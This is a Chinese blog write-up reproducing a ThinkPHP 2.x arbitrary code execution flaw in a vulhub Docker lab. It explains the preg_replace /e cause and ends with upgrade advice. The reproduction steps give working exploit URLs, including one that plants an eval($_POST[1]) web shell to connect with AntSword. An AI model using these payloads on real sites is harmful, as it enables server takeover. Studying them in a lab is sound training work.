---
title: 【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行
date: 2025-09-02
categories:
  - Web攻防
  - 渗透测试
  - 靶场
image: images/29.webp
---
# 0x00 实验环境
攻击机：Win 11
靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）
vulhub靶场下载地址：
```
https://vulhub.org/zh#/environments/thinkphp/2-rce/
```
部署：
```
cd vulhub-master/thinkphp/2-rce 
docker-compose up -d 
docker ps
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png)
# 0x01 影响版本
**标志**：/index.php
**版本**：thinkphp2.x
**简介**：在ThinkPHP 2.x版本中，使用preg_replace的`/e`模式匹配路由：
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```
导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞
大体说的还是因为php版本在**5.6.29**以下时都是支持该函数执行中间的命令的，可到了**7.x**就不支持了。简单来讲就是
```
preg_replace('正则规则','替换字符','目标字符')
```
**e** 配合函数**preg_replace()使用**, 可以把匹配来的字符串当作正则表达式执行;
**/e** 可执行模式，此为PHP专有参数，例如preg_replace函数。
例如：
```
<?php
@preg_replace('/test/e','print_r("AAA");','just test');
```
只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。
# 0x02 漏洞复现
注：复现是比较简单的，原理需要自己去深入剖析
（1）访问页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png)
（2）使用报错爆出thinkphp的版本2.1：
```
http://192.168.197.140:8080/index.php/111
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png)
 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件<=php5.6.29，下面这个版本是满足条件的：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png)
（4）漏洞利用：
```
http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()}
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png)
（5）传马，使用以下语句（类似于在该页面写入了一句话木马）：
```
http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))}
```
菜刀与蚁剑均能连接：
蚁剑连接：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png)
# 0x02 漏洞修复
**升级框架版本**
ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。**最彻底的方式是升级到官方支持的最新版本**（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。


